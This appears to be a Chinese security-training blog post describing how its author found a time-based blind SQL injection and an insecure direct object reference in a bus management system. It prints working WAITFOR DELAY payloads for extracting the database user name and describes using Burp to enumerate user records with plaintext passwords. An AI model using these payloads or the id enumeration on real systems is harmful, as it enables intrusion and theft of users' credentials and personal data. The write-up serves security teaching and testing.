#  某公交管理系统简易逻辑漏洞+SQL注入挖掘   
原创 zkaq-xhys  掌控安全EDU   2025-01-15 04:03  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
# 本文由掌控安全学院 - xhys 投稿  
  
**来****Track安全社区投稿~**  
  
**千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
# 某公交管理系统挖掘  
## SQL注入漏洞  
  
前台通过给的账号密码,进去  
  
按顺序依次点击1、2、3走一遍功能点，然后开启抓包点击4  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibDCMzS2LWSngeRzMicfyia0bUUia8SjrPib2AGaRcqtvgib4J00Z103SUEMg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
当点击上图的4步骤按钮时，会抓到图下数据包，将其转发到burp的重放模块  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibb5Y5Cag19weJibo8c0ho16tXvXQ1LF4GY7YeeoVrp1pDJrmogFSa83A/640?wx_fmt=png&from=appmsg "")  
  
img  
  
构造以下注入poc，可见注入延时了五秒，用户输入的语句成功拼接到原有的SQL语句上执行了 下面的poc是MenuIds的值  
```
100,101,151,152,153,154,200,201,202,203,204,300,301,302,303,305,306,307,308,311,312,313,314,400,401,800,801,802,805,806,850,851,852,853,861,862,863,870,880,900,9070,9071,9080,9081,9082,9083,9084,9085,9086,9093’;WAITFOR DELAY ’0:0:5’ --
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibObxDX8RRXVgAOnKZ2xaQ7gDwnwFX6g4cekktUicI0WricfNicuCKnjuGg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
下面开始进行注入拿数据，构造下面poc，对数据库当前用户名进行查询  
```
100,101,151,152,153,154,200,201,202,203,204,300,301,302,303,305,306,307,308,311,312,313,314,400,401,800,801,802,805,806,850,851,852,853,861,862,863,870,880,900,9070,9071,9080,9081,9082,9083,9084,9085,9086,9093’;if(ascii(substring((select user),1,1)))=116 WAITFOR DELAY ’0:0:5’ --
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibkN6xVCAuCRqabic9DgZ3ahpkibrtVRk8J9ZAN6XblP7Yah8YD9e9MKBw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
成功延时5秒，说明数据库当前用户名第一个字母为t，下面继续对数据库用户名第N位字母进行猜解  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTib3A21YhHfibRa97Vnmlo78gd4Viccpz8QicHXS2BO0rJBDUWmffVwAe6Ow/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
后面通过注入我成功拿到当前数据库用户名  
# 越权漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibwfVQGS686iata1aVOowQZsEFIDNWIBGpSul3e6h0ibiaHbRcZ8ibNR6AFg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
在点击上图中的编辑按钮时，开启抓包，抓到下图示数据包。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibCJ9193VlbyCjk7ib9F8nzEHMegLuZzkQI3xT3y1yBBXlzxfV4E1SxVA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
将数据包发送到burp的重放模块，然后将id值改为1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibKSfHia3JE5P3pribtibaKMUxbibRTmkzFibdDLLanAJYf2LgibA3k20HRuBg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
可以看见明文看见其他用户的账户密码、手机号、邮箱等敏感信息，我们可以利用这个信息进行登录等操作 再次将数据包转发到burp的Intruder模块，进行1-100遍历id值，可见也是将全站用户信息都可以遍历出来了，此处就只展示测试数据了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcq8sPlCzQaWDFVKaibtzlWTibT5yTNcuicmHWb3717ibFZEBb1BPXslBSDGwd5O8OPSGvjRQunA0jPK8Q/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，  
  
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**没看够~？欢迎关注！**  
  
  
  
**分享本文到朋友圈，可以凭截图找老师领取**  
  
上千**教程+工具+交流群+靶场账号**哦  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
******分享后扫码加我！**  
  
  
**回顾往期内容**  
  
[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)  
  
  
[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  
  
  
[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  
  
  
[记某地级市护网的攻防演练行动](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247543747&idx=1&sn=c7745ecb8b33401ae317c295bed41cc8&token=74838194&lang=zh_CN&scene=21#wechat_redirect)  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247542576&idx=1&sn=d9f419d7a632390d52591ec0a5f4ba01&scene=21#wechat_redirect)  
[手把手教你CNVD漏洞挖掘 + 资产收集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247542576&idx=1&sn=d9f419d7a632390d52591ec0a5f4ba01&token=74838194&lang=zh_CN&scene=21#wechat_redirect)  
  
  
[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)  
  
##     代理池工具撰写 | 只有无尽的跳转，没有封禁的IP！  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
点赞+在看支持一下吧~感谢看官老爷~   
  
你的点赞是我更新的动力  
  
  
